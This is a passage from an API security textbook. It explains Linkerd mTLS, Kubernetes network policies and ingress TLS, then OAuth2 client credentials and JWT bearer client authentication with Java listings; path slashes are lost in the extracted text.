name: natter-api   annotations:                          linkerd.io inject: enabled       Add the linkerd  annotation to enable  the service mesh.  Run the following command to update the namespace definition:  kubectl apply -f kubernetes natter-namespace.yaml  You can force a restart of each deployment in the namespace by running the following commands:  kubectl rollout restart deployment \   natter-database-deployment -n natter-api kubectl rollout restart deployment \   link-preview-deployment -n natter-api kubectl rollout restart deployment \   natter-api-deployment -n natter-api  For HTTP APIs, such as the Natter API itself and the link-preview microservice, this is all that is required to upgrade those services to HTTPS when called from other ser- vices  within  the  service  mesh.  You  can  verify  this  by  using  the  Linkerd  tap  utility, which allows for monitoring network connections in the cluster. You can start tap by running the following command in a new terminal window:  linkerd tap ns natter-api  If you then request a message that contains a link to trigger a call to the link-preview service  using the steps at the end of section 10.2.6 , you’ll see the network requests in the tap output. This shows the initial request from curl without TLS  tls = not_provided _by_remote ,  followed  by  the  request  to  the  link-preview  service  with  TLS  enabled  tls = true . Finally, the response is returned to curl without TLS:  req id=2:0 proxy=in  src=172.17.0.1:57757 dst=172.17.0.4:4567     ➥ tls=not_provided_by_remote :method=GET :authority=            ➥ natter-api-service:4567 :path= spaces 1 messages 1            req id=2:1 proxy=out src=172.17.0.4:53996 dst=172.17.0.16:4567     ➥ tls=true :method=GET :authority=natter-link-preview-            ➥ service:4567 :path= preview                                     rsp id=2:1 proxy=out src=172.17.0.4:53996 dst=172.17.0.16:4567     ➥ tls=true :status=200 latency=479094µs                           end id=2:1 proxy=out src=172.17.0.4:53996 dst=172.17.0.16:4567     ➥ tls=true duration=665µs response-length=330B                    rsp id=2:0 proxy=in  src=172.17.0.1:57757 dst=172.17.0.4:4567      ➥ tls=not_provided_by_remote :status=200 latency=518314µs          end id=2:0 proxy=in  src=172.17.0.1:57757                           ➥ dst=172.17.0.4:4567 tls=not_provided_by_remote duration=169µs    ➥ response-length=428B                                              The initial  response from curl  is not using TLS.  The response  back to curl  is also sent  without TLS.  You’ll enable TLS for requests coming into the network from external clients in sec- tion 10.4.  The internal call to the link-preview service is upgraded to TLS.   374  CHAPTER 10 Microservice APIs in Kubernetes  Mutual TLS Linkerd and most other service meshes don’t just supply normal TLS server certifi- cates,  but  also  client  certificates  that  are  used  to  authenticate  the  client  to  the server. When both sides of a connection authenticate using certificates this is known as mutual TLS, or mutually authenticated TLS, often abbreviated mTLS. It’s important to know that mTLS is not by itself any more secure than normal TLS. There are no attacks against TLS at the transport layer that are prevented by using mTLS. The pur- pose of a server certificate is to prevent the client connecting to a fake server, and it does this by authenticating the hostname of the server. If you recall the discussion of authentication in chapter 3, the server is claiming to be api.example.com and the server certificate authenticates this claim. Because the server does not initiate con- nections to the client, it does not need to authenticate anything for the connection to be secure.  The value of mTLS comes from the ability to use the strongly authenticated client identity communicated by the client certificate to enforce API authorization policies at the  server.  Client  certificate  authenticate  is  significantly  more  secure  than  many other authentication mechanisms but is complex to configure and maintain. By han- dling this for you, a service mesh enables strong API authentication mechanisms. In chapter 11, you’ll learn how to combine mTLS with OAuth2 to combine strong client authentication with token-based authorization.  The current version of Linkerd can automatically upgrade only HTTP traffic to use TLS, because it relies on reading the HTTP Host header to determine the target ser- vice. For other protocols, such as the protocol used by the H2 database, you’d need to manually set up TLS certificates.  TIP Some service meshes, such as Istio, can automatically apply TLS to non- HTTP traffic too.3 This is planned for the 2.7 release of Linkerd. See Istio in Action by Christian E. Posta  Manning, 2020  if you want to learn more about Istio and service meshes in general.  Pop quiz 5 Which of the following are reasons to use an intermediate CA? Select all that apply.  a To have longer certificate chains b To keep your operations teams busy c To use smaller key sizes, which are faster d So that the root CA key can be kept offline e To allow revocation in case the CA key is compromised  3  Istio has more features that Linkerd but is also more complex to install and configure, which is why I chose Linkerd for this chapter.   Securing microservice communications  375  6  True or False: A service mesh can automatically upgrade network requests to use TLS.  The answers are at the end of the chapter.  10.3.3 Locking down network connections  Enabling  TLS  in  the  cluster  ensures  that  an  attacker  can’t  modify  or  eavesdrop  on communications between APIs in your network. But they can still make their own connections  to  any  service  in  any  namespace  in  the  cluster.  For  example,  if  they compromise an application running in a separate namespace, they can make direct connections to the H2 database running in the  natter-api namespace. This might allow them to attempt to guess the connection password, or to scan services in the net- work for vulnerabilities to exploit. If they find a vulnerability, they can then compro- mise that service and find new attack possibilities. This process of moving from service to service inside your network after an initial compromise is known as lateral movement and is a common tactic.  DEFINITION Lateral movement is the process of an attacker moving from system to system within your network after an initial compromise. Each new system compromised provides new opportunities to carry out further attacks, expand- ing the systems under the attacker’s control. You can learn more about com- mon attack tactics through frameworks such as MITRE ATT&CK  https:  attack .mitre.org .  To make it harder for an attacker to carry out lateral movement, you can apply network policies in Kubernetes that restrict which pods can connect to which other pods in a network. A network policy allows you to state which pods are expected to connect to each other and Kubernetes will then enforce these rules to prevent access from other pods. You can define both ingress rules that determine what network traffic is allowed into a pod, and egress rules that say which destinations a pod can make outgoing con- nections to.  DEFINITION A  Kubernetes  network  policy   http:  mng.bz v94J   defines  what network traffic is allowed into and out of a set of pods. Traffic coming into a pod is known as ingress, while outgoing traffic from the pod to other hosts is known as egress.  Because Minikube does not support network policies currently, you won’t be able to apply  and  test  any  network  policies  created  in  this  chapter.  Listing  10.19  shows  an example network policy that you could use to lock down network connections to and from the H2 database pod. Apart from the usual name and namespace declarations, a network policy consists of the following parts:   A podSelector that describes which pods in the namespace the policy will apply to. If no policies select a pod, then it will be allowed all ingress and egress traffic   376  CHAPTER 10 Microservice APIs in Kubernetes  by default, but if any do then it is only allowed traffic that matches at least one of the rules defined. The podSelector: {} syntax can be used to select all pods in the namespace.   A set of policy types defined in this policy, out of the possible values  Ingress and Egress. If only ingress policies are applicable to a pod then Kubernetes will still permit all egress traffic from that pod by default, and vice versa. It’s best to explicitly  define  both  Ingress  and  Egress  policy  types  for  all  pods  in  a  name- space to avoid confusion.   An ingress section that defines allowlist ingress rules. Each ingress rule has a from section that says which other pods, namespaces, or IP address ranges can make network connections to the pods in this policy. It also has a ports section that defines which TCP and UDP ports those clients can connect to.   An egress section that defines the allowlist egress rules. Like the ingress rules, egress  rules  consist  of  a  to  section  defining  the  allowed  destinations  and  a ports section defining the allowed target ports.  TIP Network policies apply to only new connections being established. If an incoming connection is permitted by the ingress policy rules, then any outgo- ing traffic related to that connection will be permitted without defining indi- vidual egress rules for each possible client.  Listing 10.19 defines a complete network policy for the H2 database. For ingress, it defines a rule that allows connections to TCP port 9092 from pods with the label app: natter-api. This allows the main Natter API pods to talk to the database. Because no other ingress rules are defined, no other incoming connections will be accepted. The policy in listing 10.19 also lists the  Egress policy type but doesn’t define any egress rules,  which  means  that  all  outbound  connections  from  the  database  pods  will  be blocked. This listing is to illustrate how network policies work; you don’t need to save the file anywhere.  NOTE The  allowed  ingress  or  egress  traffic  is  the  union  of  all  policies  that select a pod. For example, if you add a second policy that permits the data- base pods to make egress connections to google.com then this will be allowed even though the first policy doesn’t allow this. You must examine all policies in a namespace together to determine what is allowed.  Listing 10.19 Token database network policy  apiVersion: networking.k8s.io v1 kind: NetworkPolicy metadata:   name: database-network-policy   namespace: natter-api spec:   podSelector:                     matchLabels:                     app: natter-database      Apply the policy to pods with the  app=natter-database label.   Securing incoming requests  377  The policy applies to both  incoming  ingress  and  outgoing  egress  traffic.    policyTypes:     - Ingress          - Egress         ingress:     - from:                              - podSelector:                       matchLabels:                       app: natter-api          ports:                            - protocol: TCP                   port: 9092             Allow ingress only from pods with  the label app=natter-api-service  in the same namespace.  Allow ingress only  to TCP port 9092.  You can create the policy and apply it to the cluster using kubectl apply, but on Mini- kube it will have no effect because Minikube’s default networking components are not able to enforce policies. Most hosted Kubernetes services, such as those provided by Goo- gle, Amazon, and Microsoft, do support enforcing network policies. Consult the docu- mentation for your cloud provider to see how to enable this. For self-hosted Kubernetes clusters, you can install a network plugin such as Calico  https:  www.projectcalico.org  or Cilium  https:  cilium.readthedocs.io en v1.6  .   As an alternative to network policies, Istio supports defining network authorization rules in terms of the service identities contained in the client certificates it uses for mTLS  within  the  service  mesh.  These  policies  go  beyond  what  is  supported  by  net- work policies and can control access based on HTTP methods and paths. For exam- ple,  you  can  allow  one  service  to  only  make  GET  requests  to  another  service.  See http:  mng.bz 4BKa for more details. If you have a dedicated security team, then ser- vice mesh authorization allows them to enforce consistent security controls across the cluster,  allowing  API  development  teams  to  concentrate  on  their  unique  security requirements.  WARNING Although service mesh authorization policies can significantly harden your network, they are not a replacement for API authorization mechanisms. For example, service mesh authorization provides little protection against the SSRF attacks discussed in section 10.2.7 because the malicious requests will be transparently authenticated by the proxies just like legitimate requests.   10.4 Securing incoming requests  So  far,  you’ve  only  secured  communications  between  microservice  APIs  within  the cluster. The Natter API can also be called by clients outside the cluster, which you’ve been doing with curl. To secure requests into the cluster, you can enable an  ingress controller that will receive all requests arriving from external sources as shown in fig- ure 10.7. An ingress controller is a reverse proxy or load balancer, and can be config- ured to perform TLS termination, rate-limiting, audit logging, and other basic security controls. Requests that pass these checks are then forwarded on to the services within the network. Because the ingress controller itself runs within the network, it can be included in the Linkerd service mesh, ensuring that the forwarded requests are auto- matically upgraded to HTTPS.   378  CHAPTER 10 Microservice APIs in Kubernetes  Ingress controller  Pod  Pod  An ingress controller acts as a gateway for external clients. The ingress routes requests to internal services and can terminate TLS and apply basic rate-limiting.  Figure 10.7 An ingress controller acts as a gateway for all requests from  external clients. The ingress can perform tasks of a reverse proxy or load  balancer, such as terminating TLS connections, performing rate-limiting,  and adding audit logging.  DEFINITION A Kubernetes ingress controller is a reverse proxy or load balancer that  handles  requests  coming  into  the  network  from  external  clients.  An ingress controller also often functions as an API gateway, providing a unified API for multiple services within the cluster.  NOTE An ingress controller usually handles incoming requests for an entire Kubernetes cluster. Enabling or disabling an ingress controller may therefore have implications for all pods running in all namespaces in that cluster.  To enable an ingress controller in Minikube, you need to enable the ingress add-on. Before you do that, if you want to enable mTLS between the ingress and your services you can annotate the kube-system namespace to ensure that the new ingress pod that gets  created  will  be  part  of  the  Linkerd  service  mesh.  Run  the  following  two  com- mands to launch the ingress controller inside the service mesh. First run  kubectl annotate namespace kube-system linkerd.io inject=enabled  and then run:  minikube addons enable ingress  This  will  start  a  pod  within  the  kube-system  namespace  running  the  NGINX  web server  https:  nginx.org , which is configured to act as a reverse proxy. The ingress controller will take a few minutes to start. You can check its progress by running the command:   kubectl get pods -n kube-system --watch   Securing incoming requests  379  After you have enabled the ingress controller, you need to tell it how to route requests to the services in your namespace. This is done by creating a new YAML configuration file  with  kind  Ingress.  This  configuration  file  can  define  how  HTTP  requests  are mapped to services within the namespace, and you can also enable TLS, rate-limiting, and other features  see http:  mng.bz Qxqw for a list of features that can be enabled .     Listing  10.20  shows  the  configuration  for  the  Natter  ingress  controller.  To  allow Linkerd to automatically apply mTLS to connections between the ingress controller and the backend services, you need to rewrite the Host header from the external value  such as api.natter.local  to the internal name used by your service. This can be achieved by adding the nginx.ingress.kubernetes.io upstream-vhost annotation. The NGINX configuration defines variables for the service name, port, and namespace based on the configuration so you can use these in the definition. Create a new file named natter- ingress.yaml in the kubernetes folder with the contents of the listing, but don’t apply it just yet. There’s one more step you need before you can enable TLS.  TIP If you’re not using a service mesh, your ingress controller may support establishing  its  own  TLS  connections  to  backend  services  or  proxying  TLS connections  straight  through  to  those  services   known  as  SSL  passthrough . Istio includes an alternative ingress controller, Istio Gateway, that knows how to connect to the service mesh.  Listing 10.20 Configuring ingress  Define the Ingress  resource.  Rewrite the Host header using the upstream-vhost annotation.  Give the ingress rules a name  in the natter-api namespace.  apiVersion: extensions v1beta1 kind: Ingress                    metadata:   name: api-ingress            namespace: natter-api        annotations:     nginx.ingress.kubernetes.io upstream-vhost:                             "$service_name.$namespace.svc.cluster.local:$service_port"      spec:   tls:                               - hosts:                             - api.natter.local             secretName: natter-tls       rules:                                             - host: api.natter.local                           http:                                              paths:                                             - backend:                                           serviceName: natter-api-service                  servicePort: 4567                   Define a route to direct  all HTTP requests to the  natter-api-service.  Enable TLS by providing  a certificate and key.  To  allow  the  ingress  controller  to  terminate  TLS  requests  from  external  clients,  it needs to be configured with a TLS certificate and private key. For development, you can create a certificate with the mkcert utility that you used in chapter 3:  mkcert api.natter.local   380  CHAPTER 10 Microservice APIs in Kubernetes  This will spit out a certificate and private key in the current directory as two files with the .pem extension. PEM stands for Privacy Enhanced Mail and is a common file for- mat for keys and certificates. This is also the format that the ingress controller needs. To make the key and certificate available to the ingress, you need to create a Kubernetes secret to hold them.  DEFINITION Kubernetes secrets are a standard mechanism for distributing pass- words, keys, and other credentials to pods running in a cluster. The secrets are stored in a central database and distributed to pods as either filesystem mounts or environment variables. You’ll learn more about Kubernetes secrets in chapter 11.  To make the certificate available to the ingress, run the following command:  kubectl create secret tls natter-tls -n natter-api \   --key=api.natter.local-key.pem --cert=api.natter.local.pem  This  will  create  a  TLS  secret  with  the  name  natter-tls  in  the  natter-api  name- space with the given key and certificate files. The ingress controller will be able to find this secret because of the secretName configuration option in the ingress config- uration file. You can now create the ingress configuration to expose the Natter API to external clients:  kubectl apply -f kubernetes natter-ingress.yaml  You’ll now be able to make direct HTTPS calls to the API:  $ curl https:  api.natter.local users \   -H 'Content-Type: application json' \   -d '{"username":"abcde","password":"password"}' {"username":"abcde"}  If you check the status of requests using Linkerd’s tap utility, you’ll see that requests from the ingress controller are protected with mTLS:  $ linkerd tap ns natter-api req id=4:2 proxy=in  src=172.17.0.16:43358 dst=172.17.0.14:4567  ➥ tls=true :method=POST :authority=natter-api-service.natter- ➥ api.svc.cluster.local:4567 :path= users rsp id=4:2 proxy=in  src=172.17.0.16:43358 dst=172.17.0.14:4567 ➥ tls=true :status=201 latency=322728µs  You now have TLS from clients to the ingress controller and mTLS between the ingress controller and backend services, and between all microservices on the backend.4  4 The exception is the H2 database as Linkerd can’t automatically apply mTLS to this connection. This should  be fixed in the 2.7 release of Linkerd.

Summary   Kubernetes is a popular way to manage a collection of microservices running on a shared cluster.  Microservices are deployed as  pods,  which are  groups of related Linux containers. Pods are scheduled across nodes, which are physical or virtual machines that make up the cluster. A service is implemented by one or more pod replicas.   A  security  context  can  be  applied  to  pod  deployments  to  ensure  that  the  con- tainer runs as a non-root user with limited privileges. A pod security policy can be applied to the cluster to enforce that no container is allowed elevated privileges.  When an API makes network requests to a URL provided by a user, you should ensure that you validate the URL to prevent SSRF attacks. Strict allowlisting of permitted URLs should be preferred to blocklisting. Ensure that redirects are   382  CHAPTER 10 Microservice APIs in Kubernetes  also validated. Protect your APIs from DNS rebinding attacks by strictly validat- ing the Host header and enabling TLS.   Enabling TLS for all internal service communications protects against a variety of attacks and limits the damage if an attacker breaches your network. A service mesh such as Linkerd or Istio can be used to automatically manage mTLS con- nections between all services.   Kubernetes network policies can be used to lock down allowed network com- munications,  making  it  harder  for  an  attacker  to  perform  lateral  movement inside  your  network.  Istio  authorization  policies  can  perform  the  same  task based on service identities and may be easier to configure.   A Kubernetes ingress controller can be used to allow connections from external clients and apply consistent TLS and rate-limiting options. By adding the ingress controller to the service mesh you can ensure connections from the ingress to backend services are also protected with mTLS.   Securing service-to-service APIs  This chapter covers  Authenticating services with API keys and JWTs  Using OAuth2 for authorizing service-to-service    TLS client certificate authentication and   API calls  mutual TLS   Credential and key management for services  Making service calls in response to user requests  In  previous  chapters,  authentication  has  been  used  to  determine  which  user  is accessing an API and what they can do. It’s increasingly common for services to talk to other services without a user being involved at all. These service-to-service API calls  can  occur  within  a  single  organization,  such  as  between  microservices,  or between organizations when an API is exposed to allow other businesses to access data or services. For example, an online retailer might provide an API for resellers to search products and place orders on behalf of customers. In both cases, it is the API client that needs to be authenticated rather than an end user. Sometimes this is needed for  billing  or  to  apply limits  according to a service contract, but it’s also essential for security when sensitive data or operations may be performed. Services are often granted wider access than individual users, so stronger protections may  383   384  CHAPTER 11 Securing service-to-service APIs  be  required  because  the  damage  from  compromise  of  a  service  account  can  be greater than any individual user account. In this chapter, you’ll learn how to authenti- cate services and additional hardening that can be applied to better protect privileged accounts, using advanced features of OAuth2.  NOTE The examples in this chapter require a running Kubernetes installa- tion configured according to the instructions in appendix B.  11.1 API keys and JWT bearer authentication  One of the most common forms of service authentication is an API key, which is a sim- ple  bearer  token  that  identifies  the  service  client.  An  API  key  is  very  similar  to  the tokens you’ve used for user authentication in previous chapters, except that an API key identifies a service or business rather than a user and usually has a long expiry time. Typically, a user logs in to a website  known as a developer portal  and generates an API key that they can then add to their production environment to authenticate API calls, as shown in figure 11.1.  A developer requests access to the API from the developer portal.  api.example.com  developers.example.com  Request access  API key  . . . . = y e k _ i p a ? s t n u o c c a   T E G  client.foo.com  API key  The portal generates an API key that is sent on API requests to authenticate the client.  Developer  Figure 11.1 To gain access to an API, a representative of the organization  logs into a developer portal and requests an API key. The portal generates the  API key and returns it. The developer then includes the API key as a query  parameter on requests to the API.   The OAuth2 client credentials grant  385  Section 11.5 covers techniques for securely deploying API keys and other credentials. The API key is added to each request as a request parameter or custom header.  DEFINITION An API key is a token that identifies a service client rather than a user. API keys are typically valid for a much longer time than a user token, often months or years.  Any of the token formats discussed in chapters 5 and 6 are suitable for generating API keys, with the username replaced by an identifier for the service or business that API usage should be associated with and the expiry time set to a few months or years in  the  future.  Permissions  or  scopes  can  be  used  to  restrict  which  API  calls  can  be called by which clients, and the resources they can read or modify, just as you’ve done for users in previous chapters—the same techniques apply.   An increasingly common choice is to replace ad hoc API key formats with standard JSON  Web Tokens. In this  case, the JWT is generated by the  developer  portal  with claims describing the client and expiry time, and then either signed or encrypted with one of the symmetric authenticated encryption schemes described in chapter 6. This is known as JWT bearer authentication, because the JWT is acting as a pure bearer token: any client in possession of the JWT can use it to access the APIs it is valid for without presenting any other credentials. The JWT is usually passed to the API in the Authori- zation header using the standard Bearer scheme described in chapter 5.  DEFINITION In JWT bearer authentication, a client gains access to an API by pre- senting a JWT that has been signed by an issuer that the API trusts.  An advantage of JWTs over simple database tokens or encrypted strings is that you can use public key signatures to allow a single developer portal to generate tokens that are accepted by many different APIs. Only the developer portal needs to have access to the private key used to sign the JWTs, while each API server only needs access to the public key. Using public key signed JWTs in this way is covered in section 7.4.4, and the same approach can be used here, with a developer portal taking the place of the AS.  WARNING Although using JWTs for client authentication is more secure than client secrets, a signed JWT is still a bearer credential that can be used by any- one that captures it until it expires. A malicious or compromised API server could take the JWT and replay it to other APIs to impersonate the client. Use expiry, audience, and other standard JWT claims  chapter 6  to reduce the impact if a JWT is compromised.  11.2 The OAuth2 client credentials grant  Although JWT bearer authentication is appealing due to its apparent simplicity, you still need to develop the portal for generating JWTs, and you’ll need to consider how to revoke tokens when a service is retired or a business partnership is terminated. The need  to  handle  service-to-service  API  clients  was  anticipated  by  the  authors  of  the   386  CHAPTER 11 Securing service-to-service APIs  OAuth2 specifications, and a dedicated grant type was added to support this case: the client credentials grant. This grant type allows an OAuth2 client to obtain an access token using its own credentials without a user being involved at all. The access token issued by the authorization server  AS  can be used just like any other access token, allowing an existing OAuth2 deployment to be reused for service-to-service API calls. This allows the AS to be used as the developer portal and all the features of OAuth2, such as discoverable token revocation and introspection endpoints discussed in chap- ter 7, to be used for service calls.  WARNING If an API accepts calls from both end users and service clients, it’s important to make sure that the API can tell which is which. Otherwise, users may  be  able  to  impersonate  service  clients  or  vice  versa.  The  OAuth2  stan- dards don’t define a single way to distinguish these two cases, so you should consult the documentation for your AS vendor.  To obtain an access token using the client credentials grant, the client makes a direct HTTPS request to the token endpoint of the AS, specifying the client_credentials grant type and the scopes that it requires. The client authenticates itself using its own credentials. OAuth2 supports a range of different client authentication mechanisms, and  you’ll  learn  about  several  of  them  in  this  chapter.  The  simplest  authentication method is known as client_secret_basic, in which the client presents its client ID and a secret value using HTTP Basic authentication.1 For example, the following curl command shows how to use the client credentials grant to obtain an access token for a client with the ID test and secret value password:  $ curl -u test:password \            -d 'grant_type=client_credentials&scope=a+b+c' \          https:  as.example.com access_token  Send the client ID and secret  using Basic authentication.  Specify the client_ credentials grant.  Assuming  the  credentials  are  correct,  and  the  client  is  authorized  to  obtain  access tokens using this grant and the requested scopes, the response will be like the following:  {   "access_token": "q4TNVUHUe9A9MilKIxZOCIs6fI0",   "scope": "a b c",   "token_type": "Bearer",   "expires_in": 3599 }  NOTE OAuth2 client secrets are not passwords intended to be remembered by users. They are usually long random strings of high entropy that are gener- ated automatically during client registration.  1 OAuth2 Basic authentication requires additional URL-encoding if the client ID or secret contain non-ASCII  characters. See https:  tools.ietf.org html rfc6749section-2.3.1 for details.   The OAuth2 client credentials grant  387  The access token can then be used to access APIs just like any other OAuth2 access token discussed in chapter 7. The API validates the access token in the same way that it would validate any other access token, either by calling a token introspection end- point or directly validating the token if it is a JWT or other self-contained format.  TIP The  OAuth2  spec  advises  AS  implementations  not  to  issue  a  refresh token when using the client credentials grant. This is because there is little point in the client using a refresh token when it can obtain a new access token by using the client credentials grant again.  As discussed in chapter 8, user accounts are often held in a LDAP directory or other central database, allowing APIs to look up users and determine their roles and permis- sions. This is usually not the case for OAuth2 clients, which are often stored in an AS-specific database as in figure 11.2. A consequence of this is that the API can vali- date the access token but then has no further information about who the client is to make access control decisions.   One solution to this problem is for the API to make access control decisions purely based on the scope or other information related to the access token itself. In this case, access  tokens  act  more  like  the  capability  tokens  discussed  in  chapter  9,  where  the  11.2.1 Service accounts  Clients  OAuth2 clients details are private to the AS and not shared.  as.example.com  api.example.com  User accounts  User and service accounts are in a shared repository, allowing APIs to query role and group memberships.  Figure 11.2 An authorization server  AS   typically stores client details in a private  database, so these details are not accessible to  APIs. A service account lives in the shared user  repository, allowing APIs to look up identity  details such as role or group membership.   388  CHAPTER 11 Securing service-to-service APIs  token grants access to resources on its own and the identity of the client is ignored. Fine-grained scopes can be used to limit the amount of access granted.   Alternatively, the client can avoid the client credentials grant and instead obtain an access token for a service account. A service account acts like a regular user account and is created in a central directory and assigned permissions and roles just like any other account.  This  allows  APIs  to  treat  an  access  token  issued  for  a  service  account  the same as an access token issued for any other user, simplifying access control. It also allows administrators to use the same tools to manage service accounts that they use to manage user accounts. Unlike a user account, the password or other credentials for a service  account  should  be  randomly  generated  and  of  high  entropy,  because  they don’t need to be remembered by a human.  DEFINITION A  service  account  is  an  account  that  identifies  a  service  rather than a real user. Service accounts can simplify access control and account management because they can be managed with the same tools you use to manage users.  In a normal OAuth2 flow, such as the authorization code grant, the user’s web browser is redirected to a page on the AS to login and consent to the authorization request. For a service account, the client instead uses a non-interactive grant type that allows it to submit the service account credentials directly to the token endpoint. The client must have access to the service account credentials, so there is usually a service account dedicated to each client. The simplest grant type to use is the Resource Owner Pass- word  Credentials   ROPC   grant  type,  in  which  the  service  account  username  and password are sent to the token endpoint as form fields:  $ curl -u test:password \                      -d 'grant_type=password&scope=a+b+c' \   -d 'username=serviceA&password=password' \       https:  as.example.com access_token  Send the client ID and  secret using Basic auth.  Pass the service account  password in the form data.  This  will  result  in  an  access  token  being  issued  to  the  test  client  with  the  service account serviceA as the resource owner.  WARNING Although the ROPC grant type is more secure for service accounts than for end users, there are better authentication methods available for ser- vice clients discussed in sections 11.3 and 11.4. The ROPC grant type may be deprecated or removed in future versions of OAuth.  The main downside of service accounts is the requirement for the client to manage two  sets  of  credentials,  one  as  an  OAuth2  client  and  one  for  the  service  account. This can be eliminated by arranging for the same credentials to be used for both. Alternatively, if the client doesn’t need to use features of the AS that require client credentials,  it  can  be  a  public  client  and  use  only  the  service  account  credentials for access.   The JWT bearer grant for OAuth2  389  Pop quiz 1 Which of the following are differences between an API key and a user authentica-  tion token? a API keys are more secure than user tokens. b API keys can only be used during normal business hours. c A user token is typically more privileged than an API key. d An API key identifies a service or business rather than a user. e An API key typically has a longer expiry time than a user token.  2 Which one of the following grant types is most easily used for authenticating a  service account? a PKCE b Hugh Grant c d Authorization code grant e Resource owner password credentials grant  Implicit grant  The answers are at the end of the chapter.  11.3 The JWT bearer grant for OAuth2  NOTE To  run  the  examples  in  this  section,  you’ll  need  a  running  OAuth2 authorization server. Follow the instructions in appendix A to configure the AS and a test client before continuing with this section.  Authentication with a client secret or service account password is very simple, but suf- fers from several drawbacks:   Some features of OAuth2 and OIDC require the AS to be able to access the raw bytes of the client secret, preventing the use of hashing. This increases the risk if the client database is ever compromised as an attacker may be able to recover all the client secrets.   If communications to the AS are compromised, then an attacker can steal client secrets as they are transmitted. In section 11.4.6, you’ll see how to harden access tokens  against  this  possibility,  but  client  secrets  are  inherently  vulnerable  to being stolen.   It can be difficult to change a client secret or service account password, espe-  cially if it is shared by many servers.  For these reasons, it’s beneficial to use an alternative authentication mechanism. One alternative supported by many authorization servers is the JWT Bearer grant type for OAuth2,  defined  in  RFC  7523   https:  tools.ietf.org html rfc7523 .  This  specifica- tion allows a client to obtain an access token by presenting a JWT signed by a trusted party, either to authenticate itself for the  client credentials grant, or to exchange a   390  CHAPTER 11 Securing service-to-service APIs  JWT  representing  authorization  from  a  user  or  service  account.  In  the  first  case, the JWT is signed by the client itself using a key that it controls. In the second case, the JWT is signed by some authority that is trusted by the AS, such as an external OIDC provider. This can be useful if the AS wants to delegate user authentication and con- sent  to  a  third-party  service.  For  service  account  authentication,  the  client  is  often directly trusted with the keys to sign JWTs on behalf of that service account because there is a dedicated service account for each client. In section 11.5.3, you’ll see how separating the duties of the client from the service account authentication can add an extra layer of security.   By using a public key signature algorithm, the client needs to supply only the pub- lic key to the AS, reducing the risk if the AS is ever compromised because the public key can only be used to verify signatures and not create them. Adding a short expiry time also reduces the risks when authenticating over an insecure channel, and some servers support remembering previously used JWT IDs to prevent replay.   Another advantage of JWT bearer authentication is that many authorization serv- ers support fetching the client’s public keys in JWK format from a HTTPS endpoint. The AS will periodically fetch the latest keys from the endpoint, allowing the client to change their keys regularly. This effectively bootstraps trust in the client’s public keys using the web PKI: the AS trusts the keys because they were loaded from a URI that the client specified during registration and the connection was authenticated using TLS, preventing an attacker from injecting fake keys. The JWK Set format allows the client to supply more than one key, allowing it to keep using the old signature key until it is sure that the AS has picked up the new one  figure 11.3 .  The client publishes its public key as a JWK on its own server.  The JWKSet URI is associated with the client when it registers with the AS.   jwks  client.example.com  AS  When the client authenticates to the AS, the AS fetches its public key from the registered JWKSet URI.  Figure 11.3 The client publishes its public key to a URI it controls and registers this  URI with the AS. When the client authenticates, the AS will retrieve its public key over  HTTPS from the registered URI. The client can publish a new public key whenever it  wants to change the key.   The JWT bearer grant for OAuth2  391  11.3.1 Client authentication  To obtain an access token under its own authority, a client can use JWT bearer client authentication with the client credentials grant. The client performs the same request as you did in section 11.2, but rather than supplying a client secret using Basic authen- tication, you instead supply a JWT signed with the client’s private key. When used for authentication, the JWT is also known as a client assertion.   DEFINITION An assertion is a signed set of identity claims used for authentica- tion or authorization.  To generate the public and private key pair to use to sign the JWT, you can use key- tool from the command line, as follows. Keytool will generate a certificate for TLS when  generating  a  public  key  pair,  so  use  the  -dname  option  to  specify  the  subject name. This is required even though you won’t use the certificate. You’ll be prompted for the keystore password.  keytool -genkeypair \   -keystore keystore.p12 \          -keyalg EC -keysize 256 -alias es256-key \          -dname cn=test       Specify the  keystore.  Use the EC algorithm  and 256-bit key size.  Specify a distinguished  name for the certificate.  TIP Keytool picks an appropriate elliptic curve based on the key size, and in this case happens to pick the correct P-256 curve required for the ES256 algo- rithm. There are other 256-bit elliptic curves that are incompatible. In Java 12 and later you can use the  -groupname secp256r1 argument to explicitly specify  the correct curve. For  ES384  the group  name is  secp384r1  and for ES512  it  is  secp521r1   note:  521  not  512 .  Keytool  can’t  generate  EdDSA keys at this time.  You can then load the private key from the keystore in the same way that you did in chapters 5 and 6 for the HMAC and AES keys. The JWT library requires that the key is cast to the specific ECPrivateKey type, so do that when you load it. Listing 11.1 shows the start of a JwtBearerClient class that you’ll write to implement JWT bearer authenti- cation.  Navigate  to  src main java com manning apisecurityinaction  and  create  a new file named JwtBearerClient.java. Type in the contents of the listing and save the file. It doesn’t do much yet, but you’ll expand it next. The listing contains all the import statements you’ll need to complete the class.  Listing 11.1 Loading the private key  package com.manning.apisecurityinaction;  import java.io.FileInputStream; import java.net.URI; import java.net.http.*; import java.security.KeyStore;   392  CHAPTER 11 Securing service-to-service APIs  import java.security.interfaces.ECPrivateKey; import java.util.*;  import com.nimbusds.jose.*; import com.nimbusds.jose.crypto.ECDSASigner; import com.nimbusds.jose.jwk.*; import com.nimbusds.jwt.*;  import static java.time.Instant.now; import static java.time.temporal.ChronoUnit.SECONDS; import static spark.Spark.*;  public class JwtBearerClient {     public static void main String... args  throws Exception {         var password = "changeit".toCharArray  ;         var keyStore = KeyStore.getInstance "PKCS12" ;         keyStore.load new FileInputStream "keystore.p12" ,                 password ;         var privateKey =  ECPrivateKey                                     keyStore.getKey "es256-key", password ;        } }  Cast the private key  to the required type.  For the AS to be able to validate the signed JWT you send, it needs to know where to find the public key for your client. As discussed in the introduction to section 11.3, a flexible way to do this is to publish your public key as a JWK Set because this allows you to change your key regularly by simply publishing a new key to the JWK Set. The Nim- bus JOSE+JWT library that you used in chapter 5 supports generating a JWK Set from a keystore using the JWKSet.load method, as shown in listing 11.2. After loading the JWK Set, use the toPublicJWKSet method to ensure that it only contains public key details and not the private keys. You can then use Spark to publish the JWK Set at a HTTPS URI using the standard application jwk-set+json content type. Make sure that you turn on TLS support using the secure method so that the keys can’t be tam- pered  with  in  transit,  as  discussed  in  chapter  3.  Open  the  JwtBearerClient.java  file again and add the code from the listing to the main method, after the existing code.  WARNING Make sure you don’t forget the  .toPublicJWKSet   method call. Otherwise you’ll publish your private keys to the internet!  Listing 11.2 Publishing a JWK Set  var jwkSet = JWKSet.load keyStore, alias -> password              .toPublicJWKSet  ;                                 Ensure it contains  only public keys.  Load the JWK Set from the keystore.  secure "localhost.p12", "changeit", null, null ;     get " jwks",  request, response  -> {                    response.type "application jwk-set+json" ;           return jwkSet.toString  ;                        } ;                                                   